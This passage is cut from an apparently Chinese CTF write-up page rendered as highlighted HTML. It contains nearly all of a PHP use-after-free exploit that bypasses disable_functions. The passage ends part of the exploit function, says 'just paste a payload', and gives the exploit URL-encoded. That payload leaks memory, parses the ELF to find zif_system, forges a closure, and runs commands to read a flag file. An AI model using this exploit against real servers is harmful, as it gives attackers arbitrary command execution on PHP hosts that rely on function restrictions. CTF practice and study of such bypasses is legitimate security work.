class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​直接贴一个 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=%<span class="number">3</span>f%<span class="number">3</span>e%<span class="number">3</span>c%<span class="number">3</span>fphp%<span class="number">0</span>apwn(%<span class="number">22</span>ls+%<span class="number">2</span>f%<span class="number">3</span>bcat+%<span class="number">2</span>fflag0.txt%<span class="number">22</span>)%<span class="number">3</span>b%<span class="number">0</span>a%<span class="number">0</span>afunction+<span class="title function_ invoke__">pwn</span>(%<span class="number">24</span>cmd)+%<span class="number">7</span>b%<span class="number">0</span>a++++<span class="keyword">global</span>+%<span class="number">24</span>abc%<span class="number">2</span>c+%<span class="number">24</span>helper%<span class="number">2</span>c+%<span class="number">24</span>backtrace%<span class="number">3</span>b%<span class="number">0</span>a++++<span class="class"><span class="keyword">class</span>+<span class="title">Vuln</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+<span class="title">function</span>+<span class="title">__destruct</span>()+%7<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">global</span>+%24<span class="title">backtrace</span>%3<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">unset</span>(%24<span class="title">this</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+(<span class="title">new</span>+<span class="title">Exception</span>)-%3<span class="title">egetTrace</span>()%3<span class="title">b</span>+%23+%3<span class="title">b</span>)%0<span class="title">a</span>++++++++++++<span class="title">if</span>(!<span class="title">isset</span>(%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>))+%7<span class="title">b</span>+%23+<span class="title">PHP</span>+%3<span class="title">e</span>%3<span class="title">d</span>+7.4%0<span class="title">a</span>++++++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+<span class="title">debug_backtrace</span>()%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">class</span>+<span class="title">Helper</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%2<span class="title">c</span>+%24<span class="title">b</span>%2<span class="title">c</span>+%24<span class="title">c</span>%2<span class="title">c</span>+%24<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">str2ptr</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">address</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">j</span>+%3<span class="title">d</span>+%24<span class="title">s</span>-1%3<span class="title">b</span>+%24<span class="title">j</span>+%3<span class="title">e</span>%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">j</span>--)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%3<span class="title">c</span>%3<span class="title">c</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%7<span class="title">c</span>%3<span class="title">d</span>+<span class="title">ord</span>(%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>%2<span class="title">b</span>%24<span class="title">j</span>%5<span class="title">d</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">address</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">ptr2str</span>(%24<span class="title">ptr</span>%2<span class="title">c</span>+%24<span class="title">m</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">out</span>+%3<span class="title">d</span>+%22%22%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>+(%24<span class="title">i</span>%3<span class="title">d0</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">m</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">out</span>+.%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span class="title">c</span>%24<span class="title">ptr</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">ptr</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">out</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">write</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>%2<span class="title">c</span>+%24<span class="title">v</span>%2<span class="title">c</span>+%24<span class="title">n</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span class="title">c</span>%24<span class="title">v</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">v</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">global</span>+%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">addr</span>+%2<span class="title">b</span>+%24<span class="title">p</span>+-+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">strlen</span>(%24<span class="title">helper</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(%24<span class="title">s</span>+!%3<span class="title">d</span>+8)+%7<span class="title">b</span>+%24<span class="title">leak</span>+%25%3<span class="title">d</span>+2+%3<span class="title">c</span>%3<span class="title">c</span>+(%24<span class="title">s</span>+*+8)+-+1%3<span class="title">b</span>+%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">leak</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_type</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phoff</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phentsize</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x36</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phnum</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x38</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">e_phnum</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">header</span>+%3<span class="title">d</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">e_phoff</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+%24<span class="title">e_phentsize</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_type</span>++%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_flags</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+4%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_vaddr</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_memsz</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x28</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+6)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_Write</span>%0<span class="title">a</span>++++++++++++++++%23+<span class="title">handle</span>+<span class="title">pie</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_addr</span>+%3<span class="title">d</span>+%24<span class="title">e_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+2+%3<span class="title">f</span>+%24<span class="title">p_vaddr</span>+%3<span class="title">a</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">p_vaddr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+5)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_exec</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">text_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(!%24<span class="title">data_addr</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">text_size</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">data_size</span>)%0<span class="title">a</span>++++++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%5<span class="title">b</span>%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">list</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>)+%3<span class="title">d</span>+%24<span class="title">elf</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">data_size</span>+%2<span class="title">f</span>+8%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">i</span>+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">constant</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x746e6174736e6f63</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+(%24<span class="title">i</span>+%2<span class="title">b</span>+4)+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">bin2hex</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x786568326e6962</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">return</span>+%24<span class="title">data_addr</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">base</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">start</span>+%3<span class="title">d</span>+%24<span class="title">binary_leak</span>+%26+0<span class="title">xfffffffffffff000</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x1000</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">start</span>+-+0<span class="title">x1000</span>+*+%24<span class="title">i</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+7)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x10102464c457f</span>)+%7<span class="title">b</span>+%23+<span class="title">ELF</span>+<span class="title">header</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+%24<span class="title">addr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">basic_funcs</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">do</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_entry</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">addr</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_name</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">f_entry</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">f_name</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x6d6574737973</span>)+%7<span class="title">b</span>+%23+<span class="title">system</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+<span class="title">leak</span>(%24<span class="title">addr</span>+%2<span class="title">b</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%2<span class="title">b</span>%3<span class="title">d</span>+0<span class="title">x20</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>+<span class="title">while</span>(%24<span class="title">f_entry</span>+!%3<span class="title">d</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">trigger_uaf</span>(%24<span class="title">arg</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%23+<span class="title">str_shuffle</span>+<span class="title">prevents</span>+<span class="title">opcache</span>+<span class="title">string</span>+<span class="title">interning</span>%0<span class="title">a</span>++++++++%24<span class="title">arg</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Vuln</span>()%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>-%3<span class="title">ea</span>+%3<span class="title">d</span>+%24<span class="title">arg</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">stristr</span>(<span class="title">PHP_OS</span>%2<span class="title">c</span>+%27<span class="title">WIN</span>%27))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%27<span class="title">This</span>+<span class="title">PoC</span>+<span class="title">is</span>+<span class="title">for</span>+*<span class="title">nix</span>+<span class="title">systems</span>+<span class="title">only</span>.%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">n_alloc</span>+%3<span class="title">d</span>+10%3<span class="title">b</span>+%23+<span class="title">increase</span>+<span class="title">this</span>+<span class="title">value</span>+<span class="title">if</span>+<span class="title">UAF</span>+<span class="title">fails</span>%0<span class="title">a</span>++++%24<span class="title">contiguous</span>+%3<span class="title">d</span>+%5<span class="title">b</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n_alloc</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)%0<span class="title">a</span>++++++++%24<span class="title">contiguous</span>%5<span class="title">b</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">trigger_uaf</span>(%27<span class="title">x</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc</span>+%3<span class="title">d</span>+%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>%5<span class="title">b0</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>-%3<span class="title">eb</span>+%3<span class="title">d</span>+<span class="title">function</span>+(%24<span class="title">x</span>)+%7<span class="title">b</span>+%7<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+79+%7<span class="title">c</span>%7<span class="title">c</span>+<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+0)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">UAF</span>+<span class="title">failed</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">leaks</span>%0<span class="title">a</span>++++%24<span class="title">closure_handlers</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">php_heap</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x58</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc_addr</span>+%3<span class="title">d</span>+%24<span class="title">php_heap</span>+-+0<span class="title">xc8</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">value</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x60</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x70</span>%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">reference</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+0<span class="title">x60</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x18</span>%2<span class="title">c</span>+0<span class="title">xa</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">closure_obj</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">binary_leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">closure_handlers</span>%2<span class="title">c</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">base</span>+%3<span class="title">d</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">determine</span>+<span class="title">binary</span>+<span class="title">base</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">elf</span>+%3<span class="title">d</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">parse</span>+<span class="title">ELF</span>+<span class="title">header</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">basic_funcs</span>+%3<span class="title">d</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">basic_functions</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">zif_system</span>+%3<span class="title">d</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">zif_system</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">closure</span>+<span class="title">object</span>%0<span class="title">a</span>++++%24<span class="title">fake_obj_offset</span>+%3<span class="title">d</span>+0<span class="title">xd0</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span 